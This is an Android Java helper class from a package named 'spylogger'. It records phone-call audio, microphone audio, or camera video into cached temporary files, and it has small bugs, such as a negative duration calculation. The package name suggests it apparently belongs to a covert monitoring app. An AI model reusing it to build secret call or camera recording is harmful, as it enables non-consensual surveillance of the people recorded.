package com.gravatasufoca.spylogger.helpers;

import android.content.Context;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;

import java.io.File;
import java.io.IOException;
import java.util.Date;

import lombok.Getter;
import lombok.Setter;

/**
 * Created by bruno on 20/11/16.
 */

@Getter
@Setter
public class MediaRecorderHelper implements MediaRecorder.OnInfoListener{
    private Context context;
    private MediaRecorder recorder;
    private File recordedFile;
    private boolean ligacao;
    private int maxDuration;
    private boolean recording;
    private long duration;
    private Date inicio;
    private TaskComplete callback;
    private boolean frontCamera;

    @Setter
    private boolean video;


    public MediaRecorderHelper(Context context,int maxDuration,boolean video) throws IOException {
        this.context = context;
        this.maxDuration=maxDuration*1000;
        if(!video) {
            prepareAudio();
        }
        else {
            prepareVideo();
        }

    }

    private void prepareAudio() throws IOException {
        recordedFile = File.createTempFile("record", ".mp4", context.getCacheDir());

        if(ligacao) {
            try {
                recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setOutputFile(recordedFile.getAbsolutePath());
                recorder.setMaxDuration(maxDuration);
                recorder.setOnInfoListener(this);

                recorder.prepare();

            } catch (IOException e) {
                recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setOutputFile(recordedFile.getAbsolutePath());
                recorder.setMaxDuration(maxDuration);
                recorder.setOnInfoListener(this);

                recorder.prepare();
            }
        }else{
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(recordedFile.getAbsolutePath());
            recorder.setMaxDuration(maxDuration);
            recorder.setOnInfoListener(this);

            recorder.prepare();
        }


        recording=false;
    }

    private void prepareVideo() throws IOException {
        recordedFile = File.createTempFile("record", ".mp4", context.getCacheDir());

        recorder = new MediaRecorder();
//        recorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_LOW));
        Camera cam=getCamera();
        if(cam!=null){
            recorder.setCamera(cam);
        }
        recorder.setCamera(cam);
        recorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
        recorder.setVideoSource(MediaRecorder.VideoSource.DEFAULT);
        CamcorderProfile camcorderProfile_HQ = CamcorderProfile.get(CamcorderProfile.QUALITY_LOW);
        recorder.setProfile(camcorderProfile_HQ);

        recorder.setOutputFile(recordedFile.getAbsolutePath());
        recorder.setMaxDuration(maxDuration>30000?30000:maxDuration);
        recorder.setOnInfoListener(this);

        recorder.prepare();
    }

    private Camera getCamera(){
        return Camera.open(isFrontCamera()?Camera.CameraInfo.CAMERA_FACING_FRONT:Camera.CameraInfo.CAMERA_FACING_BACK);
    }

    public void start() throws IOException {
        if(recorder!=null) {
            recorder.start();
        }else{
            prepareAudio();
            start();
        }
        duration=0;
        inicio=new Date();
        recording=true;
    }
    public void stop(){
        if(recorder!=null){
            recorder.stop();
            recorder.release();
            recorder=null;
        }
        duration=((inicio.getTime() - (new Date()).getTime()) / 1000);
        recording=false;
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        if(callback!=null){
            callback.onFinish(null);
        }
    }

    @Override
    public void onInfo(MediaRecorder mediaRecorder, int what, int i1) {
        if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
            stop();
        }
    }

}
